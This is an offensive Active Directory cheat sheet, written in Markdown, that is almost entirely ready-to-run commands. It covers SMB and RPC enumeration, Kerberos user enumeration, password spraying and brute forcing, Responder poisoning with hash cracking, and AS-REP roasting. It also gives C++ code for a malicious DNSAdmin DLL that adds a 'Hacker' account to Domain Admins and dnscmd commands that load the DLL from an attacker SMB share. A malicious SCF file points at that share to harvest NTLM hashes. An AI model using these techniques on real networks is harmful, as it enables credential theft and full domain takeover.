<!-- omit in toc -->
# Active Directory

<!-- omit in toc -->
## Table of Contents

1. [Enumeration](#enumeration)
   1. [Enumerate Machines of the Domain](#enumerate-machines-of-the-domain)
   2. [SMB](#smb)
      1. [List Shared Resources](#list-shared-resources)
         1. [CME](#cme)
   3. [Access Shared Resource](#access-shared-resource)
      1. [Get Every File in a Directory](#get-every-file-in-a-directory)
      2. [Mount Share](#mount-share)
      3. [Show File Permissions](#show-file-permissions)
   4. [RPC](#rpc)
      1. [Null Sessions](#null-sessions)
      2. [Enumerate Domain Users](#enumerate-domain-users)
   5. [Kerberos](#kerberos)
      1. [User Enumeration](#user-enumeration)
      2. [Password Spray](#password-spray)
      3. [Brute Force User](#brute-force-user)
      4. [Brute Force Users and Passwords](#brute-force-users-and-passwords)
2. [Exploitation](#exploitation)
   1. [SMB Relay](#smb-relay)
   2. [LDAP Domain Dump](#ldap-domain-dump)
   3. [ASRepRoast](#asreproast)
      1. [¿How to know if target is vulnerable?](#how-to-know-if-target-is-vulnerable)
      2. [TGT](#tgt)
         1. [Rubeus](#rubeus)
   4. [DNS Admin](#dns-admin)
   5. [Malicious SCF File](#malicious-scf-file)

## Enumeration

### Enumerate Machines of the Domain

```bash
cme {smb, winrm, ssh, ldap, mssql} 10.10.10.0/24
```

### SMB

#### List Shared Resources

```bash
smblient -U "domain.local\user%password" -L 10.10.10.1
```

##### CME

```bash
cme smb 10.10.10.1 -u 'user' -p 'password' --shares
```

### Access Shared Resource

```bash
smblient -U "domain.local\user%password" //10.10.10.1/Shared
```

#### Get Every File in a Directory

```bash
smb> prompt off

smb> mget *
```

#### Mount Share

```bash
mount -t cifs '//10.10.10.1/Share' /mnt/Share
```

#### Show File Permissions

```bash
smbcacls '//10.10.10.1/Share' /mnt/Share/file
```

### RPC

#### Null Sessions

In some cases, we can connect to the `RPC` service without having credentials:

```bash
rpcclient -U "" 10.10.10.1 -N
```

#### Enumerate Domain Users

To enumerate the users of the domain, having valid credentials, we use the following command:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x'
```

To enumerate `RIDs` of the users:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
```

If we want to display the name and description of every user in the domain:

```bash
for rdi in $(rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo 'RID $rid: '; rpcclient -U "domain.local\user%password" 10.10.10.1 -c "queryuser $rid" | grep -E -i 'name|description'; done
```

If we want to display the various groups that are in the AD, we can use the following commands (Their `RIDs` are going to be displayed):

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomgroups"
```

If we want to display the users that belong to a particular group, we can use the following command (Their `RIDs` are going to be displayed):

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "querygroupmem 0x200"
```

We can aso display all the information belonging a user, knowing his `RID`and the following command:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "queryuser 0x1f4"
```

### Kerberos

If we have the Kerberos service running, we can use the following commands to enumerate further.

#### User Enumeration

```bash
./kerbrute userenum -d domain.local users.txt
```

#### Password Spray

```bash
./kerbrute passwordspray -d domain.local domain_users.txt password
```

#### Brute Force User

```bash
./kerbrute bruteuser -d domain.local passwords.txt user
```

#### Brute Force Users and Passwords

```bash
cat credentials.txt | ./kerbrute  -d domain.local bruteforce -
```

## Exploitation

### SMB Relay

This vulnerability abuses  failed `SMB` connections. The most used tool for this is `Responder.py`. `Responder` is a tool that poisons network traffic, it can be configured in the  `/usr/share/responder/Responder.conf` directory. To poison the traffic with `Responder`:

```bash
python3 Responder.py -I eth0 -rdw
```

This tool will show us the `Net-NTLMv2` hashes of the users having failed `SMB` connections. Have in mind that `Net-NTLMv2` hashes are not usable to do  `PassTheHass`, but they can be cracked offline. 

To crack `Net-NTLMv2` hashes:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

### LDAP Domain Dump

Having valid credentials, we can list the `LDAP` service and extract valuable information. First we have to run the Apache service using the following command: `service apache2 start`. Then, we will use the `ldapdomaindump.py` tool, to list the service:

```bash
python3 ldapdomaindump.py -u 'domain.local\user' -p 'password' 10.10.10.1
```

After this process ends, we can access to the folder where the results have been added from the browser. This will display us the extracted information in a visual way.

### ASRepRoast

#### ¿How to know if target is vulnerable?

In order to make a machine ASRepRoastable we can do the following: Active Directory Users and Computers > Select the user that we want to be vulnerable > Account > Do not require Kerberos pre-authentication.

#### TGT

If a user does not have the Kerberos pre-authentication enabled, we can list their `TGTs` (Ticket Granting Tickets) using the following command:

```bash
GetNPUsers.py domain.local -no-pass -usersfile users
```

In case that a user is vulnerable, we can see how its `TGT` hash is being displayed. We can crack it offline.

##### Rubeus

We can do the same process but instead of using the `impacket` from our machine, uploading the `Rubeus.exe` binary to the target machine. We can retrieve the `TGT` hash with the following command:

```powershell
Rubeus.exe asreproast /user:user /domain:domain.local /dc:DC
```

### DNS Admin

A user who is member of the `DNSAdmins` group or has write privilege to a `DNS` server object, can load an arbitrary `DLL` with `SYSTEM` privileges on the `DNS` server. This is really interesting as the `DCs`are used frequently as `DNS` servers.

First, we have to create a malicious `DLL`. In order to do this, we have to create a file named `command.txt`, that contains the commands that are going to be run by `SYSTEM`. In this case, we will create a user named `Hacker` and add it to `Domain Admins` group. First, we have to clone [DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) repository. Then, we will change the `DnsPluginInitialize` to the following:

```cpp
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
		system("C:\\Windows\\System32\\net.exe user Hacker Password /add /domain");
		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

Finally, we execute one of the following commands, so when the `DNSService` restarts, the `DLL` is injected and a new user named Hacker is created:

```powershell
dnscmd dc.domain.local /config /serverlevelplugindll c:\DNSAdmin-DLL.dll

dnscmd dc.domain.local /config /serverlevelplugindll \\10.10.10.2\smbFolder\DNSAdmin-DLL.dll
```

It is not very common, but sometimes you can have permissions to restart the DNS service with the following commands:

```powershell
sc.exe \\dc stop dns
sc.exe \\dc start dns
```

### Malicious SCF File

In case of having writing permissions in any shared resource of the machine, we can create a malicious `SCF` file that has an icon that is hosted in a shared folder controlled by us. If any user enters the folder containing the file in the machine, when the icon is loaded, we will have a successful connection to the shared folder, and thus the `Net-NTLMv2` of the user that has loaded the icon is going to be displayed. Then, we can crack this hash  offline.

First, using`smbserver`, we will create a shared `SMB` folder.

Then, we will create the malicious `scf` file. It will contain a file in our shared folder as the icon:

```text
[Shell]
Command=2
IconFile=\\10.10.10.2\smbFolder\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

We will then upload this file to the target machine and we will wait until a user sees it. The `Net-NTLMv2` of the user that has loaded the icon is going to be listed in our `SMB` server.
